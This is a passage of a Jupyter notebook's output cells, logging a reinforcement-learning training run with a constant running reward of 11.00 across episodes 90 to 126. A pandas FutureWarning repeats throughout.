      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 90\t Frame count: 43800\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 43900\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 44000\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 44100\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 44200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 90\t Frame count: 44300\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 44400\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 44500\t Context: 2\n",
      "Running reward: 11.00\t Episode 90\t Frame count: 44600\t Context: 2\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 44700\t Context: 1\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 44800\t Context: 1\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 44900\t Context: 1\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 45000\t Context: 1\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 45100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 91\t Frame count: 45200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 91\t Frame count: 45300\t Context: 1\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 45400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 91\t Frame count: 45500\t Context: 2\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 45600\t Context: 2\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 45700\t Context: 2\n",
      "Running reward: 11.00\t Episode 91\t Frame count: 45800\t Context: 2\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 45900\t Context: 1\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 46000\t Context: 1\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 46100\t Context: 1\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 46200\t Context: 2\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 46300\t Context: 2\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 46400\t Context: 2\n",
      "Running reward: 11.00\t Episode 93\t Frame count: 46500\t Context: 2\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 46600\t Context: 1\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 46700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 94\t Frame count: 46800\t Context: 1\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 46900\t Context: 1\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 47000\t Context: 1\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 47100\t Context: 1\n",
      "Running reward: 11.00\t Episode 94\t Frame count: 47200\t Context: 1\n",
      "Running reward: 11.00\t Episode 95\t Frame count: 47300\t Context: 1\n",
      "Running reward: 11.00\t Episode 95\t Frame count: 47400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 95\t Frame count: 47500\t Context: 2\n",
      "Running reward: 11.00\t Episode 95\t Frame count: 47600\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 47700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 96\t Frame count: 47800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 96\t Frame count: 47900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 96\t Frame count: 48000\t Context: 1\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 48100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 96\t Frame count: 48200\t Context: 1\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 48300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 96\t Frame count: 48400\t Context: 1\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 48500\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 48600\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 48700\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 48800\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 48900\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 49000\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 49100\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 49200\t Context: 2\n",
      "Running reward: 11.00\t Episode 96\t Frame count: 49300\t Context: 2\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 49400\t Context: 1\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 49500\t Context: 1\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 49600\t Context: 1\n",
      "Running reward: 11.00\t Episode 97\t Frame count: 49700\t Context: 2\n",
      "Running reward: 11.00\t Episode 98\t Frame count: 49800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 99\t Frame count: 49900\t Context: 1\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 50000\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 50100\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 50200\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 50300\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 50400\t Context: 2\n",
      "Running reward: 11.00\t Episode 99\t Frame count: 50500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 100\t Frame count: 50600\t Context: 1\n",
      "Running reward: 11.00\t Episode 100\t Frame count: 50700\t Context: 2\n",
      "Running reward: 11.00\t Episode 100\t Frame count: 50800\t Context: 2\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 50900\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 51000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 101\t Frame count: 51100\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 51200\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 51300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 101\t Frame count: 51400\t Context: 1\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 51500\t Context: 2\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 51600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 101\t Frame count: 51700\t Context: 2\n",
      "Running reward: 11.00\t Episode 101\t Frame count: 51800\t Context: 2\n",
      "Running reward: 11.00\t Episode 102\t Frame count: 51900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 102\t Frame count: 52000\t Context: 1\n",
      "Running reward: 11.00\t Episode 102\t Frame count: 52100\t Context: 1\n",
      "Running reward: 11.00\t Episode 102\t Frame count: 52200\t Context: 1\n",
      "Running reward: 11.00\t Episode 102\t Frame count: 52300\t Context: 1\n",
      "Running reward: 11.00\t Episode 102\t Frame count: 52400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 102\t Frame count: 52500\t Context: 1\n",
      "Running reward: 11.00\t Episode 102\t Frame count: 52600\t Context: 2\n",
      "Running reward: 11.00\t Episode 103\t Frame count: 52700\t Context: 1\n",
      "Running reward: 11.00\t Episode 103\t Frame count: 52800\t Context: 1\n",
      "Running reward: 11.00\t Episode 103\t Frame count: 52900\t Context: 1\n",
      "Running reward: 11.00\t Episode 103\t Frame count: 53000\t Context: 1\n",
      "Running reward: 11.00\t Episode 103\t Frame count: 53100\t Context: 1\n",
      "Running reward: 11.00\t Episode 103\t Frame count: 53200\t Context: 1\n",
      "Running reward: 11.00\t Episode 104\t Frame count: 53300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 104\t Frame count: 53400\t Context: 1\n",
      "Running reward: 11.00\t Episode 104\t Frame count: 53500\t Context: 1\n",
      "Running reward: 11.00\t Episode 104\t Frame count: 53600\t Context: 2\n",
      "Running reward: 11.00\t Episode 104\t Frame count: 53700\t Context: 2\n",
      "Running reward: 11.00\t Episode 104\t Frame count: 53800\t Context: 2\n",
      "Running reward: 11.00\t Episode 104\t Frame count: 53900\t Context: 2\n",
      "Running reward: 11.00\t Episode 105\t Frame count: 54000\t Context: 1\n",
      "Running reward: 11.00\t Episode 105\t Frame count: 54100\t Context: 2\n",
      "Running reward: 11.00\t Episode 106\t Frame count: 54200\t Context: 1\n",
      "Running reward: 11.00\t Episode 106\t Frame count: 54300\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 54400\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 54500\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 54600\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 54700\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 54800\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 54900\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 55000\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 55100\t Context: 1\n",
      "Running reward: 11.00\t Episode 107\t Frame count: 55200\t Context: 2\n",
      "Running reward: 11.00\t Episode 108\t Frame count: 55300\t Context: 1\n",
      "Running reward: 11.00\t Episode 108\t Frame count: 55400\t Context: 2\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 55500\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 55600\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 55700\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 55800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 109\t Frame count: 55900\t Context: 1\n",
      "Running reward: 11.00\t Episode 109\t Frame count: 56000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 109\t Frame count: 56100\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 56200\t Context: 1\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 56300\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 56400\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 56500\t Context: 2\n",
      "Running reward: 11.00\t Episode 110\t Frame count: 56600\t Context: 2\n",
      "Running reward: 11.00\t Episode 111\t Frame count: 56700\t Context: 1\n",
      "Running reward: 11.00\t Episode 111\t Frame count: 56800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 111\t Frame count: 56900\t Context: 2\n",
      "Running reward: 11.00\t Episode 112\t Frame count: 57000\t Context: 2\n",
      "Running reward: 11.00\t Episode 112\t Frame count: 57100\t Context: 2\n",
      "Running reward: 11.00\t Episode 112\t Frame count: 57200\t Context: 2\n",
      "Running reward: 11.00\t Episode 112\t Frame count: 57300\t Context: 2\n",
      "Running reward: 11.00\t Episode 112\t Frame count: 57400\t Context: 2\n",
      "Running reward: 11.00\t Episode 112\t Frame count: 57500\t Context: 2\n",
      "Running reward: 11.00\t Episode 112\t Frame count: 57600\t Context: 2\n",
      "Running reward: 11.00\t Episode 112\t Frame count: 57700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 113\t Frame count: 57800\t Context: 1\n",
      "Running reward: 11.00\t Episode 113\t Frame count: 57900\t Context: 1\n",
      "Running reward: 11.00\t Episode 113\t Frame count: 58000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 113\t Frame count: 58100\t Context: 1\n",
      "Running reward: 11.00\t Episode 113\t Frame count: 58200\t Context: 1\n",
      "Running reward: 11.00\t Episode 113\t Frame count: 58300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 113\t Frame count: 58400\t Context: 2\n",
      "Running reward: 11.00\t Episode 113\t Frame count: 58500\t Context: 2\n",
      "Running reward: 11.00\t Episode 113\t Frame count: 58600\t Context: 2\n",
      "Running reward: 11.00\t Episode 113\t Frame count: 58700\t Context: 2\n",
      "Running reward: 11.00\t Episode 114\t Frame count: 58800\t Context: 1\n",
      "Running reward: 11.00\t Episode 114\t Frame count: 58900\t Context: 1\n",
      "Running reward: 11.00\t Episode 114\t Frame count: 59000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 114\t Frame count: 59100\t Context: 1\n",
      "Running reward: 11.00\t Episode 114\t Frame count: 59200\t Context: 1\n",
      "Running reward: 11.00\t Episode 114\t Frame count: 59300\t Context: 1\n",
      "Running reward: 11.00\t Episode 115\t Frame count: 59400\t Context: 1\n",
      "Running reward: 11.00\t Episode 115\t Frame count: 59500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 115\t Frame count: 59600\t Context: 2\n",
      "Running reward: 11.00\t Episode 116\t Frame count: 59700\t Context: 2\n",
      "Running reward: 11.00\t Episode 116\t Frame count: 59800\t Context: 2\n",
      "Running reward: 11.00\t Episode 116\t Frame count: 59900\t Context: 2\n",
      "Running reward: 11.00\t Episode 117\t Frame count: 60000\t Context: 1\n",
      "Running reward: 11.00\t Episode 117\t Frame count: 60100\t Context: 1\n",
      "Running reward: 11.00\t Episode 117\t Frame count: 60200\t Context: 1\n",
      "Running reward: 11.00\t Episode 117\t Frame count: 60300\t Context: 1\n",
      "Running reward: 11.00\t Episode 117\t Frame count: 60400\t Context: 1\n",
      "Running reward: 11.00\t Episode 117\t Frame count: 60500\t Context: 2\n",
      "Running reward: 11.00\t Episode 117\t Frame count: 60600\t Context: 2\n",
      "Running reward: 11.00\t Episode 117\t Frame count: 60700\t Context: 2\n",
      "Running reward: 11.00\t Episode 117\t Frame count: 60800\t Context: 2\n",
      "Running reward: 11.00\t Episode 118\t Frame count: 60900\t Context: 2\n",
      "Running reward: 11.00\t Episode 119\t Frame count: 61000\t Context: 1\n",
      "Running reward: 11.00\t Episode 119\t Frame count: 61100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 119\t Frame count: 61200\t Context: 1\n",
      "Running reward: 11.00\t Episode 119\t Frame count: 61300\t Context: 1\n",
      "Running reward: 11.00\t Episode 119\t Frame count: 61400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 119\t Frame count: 61500\t Context: 1\n",
      "Running reward: 11.00\t Episode 119\t Frame count: 61600\t Context: 1\n",
      "Running reward: 11.00\t Episode 120\t Frame count: 61700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 120\t Frame count: 61800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 121\t Frame count: 61900\t Context: 1\n",
      "Running reward: 11.00\t Episode 121\t Frame count: 62000\t Context: 1\n",
      "Running reward: 11.00\t Episode 121\t Frame count: 62100\t Context: 2\n",
      "Running reward: 11.00\t Episode 122\t Frame count: 62200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 123\t Frame count: 62300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 123\t Frame count: 62400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 123\t Frame count: 62500\t Context: 2\n",
      "Running reward: 11.00\t Episode 124\t Frame count: 62600\t Context: 1\n",
      "Running reward: 11.00\t Episode 124\t Frame count: 62700\t Context: 2\n",
      "Running reward: 11.00\t Episode 125\t Frame count: 62800\t Context: 1\n",
      "Running reward: 11.00\t Episode 125\t Frame count: 62900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 125\t Frame count: 63000\t Context: 2\n",
      "Running reward: 11.00\t Episode 126\t Frame count: 63100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
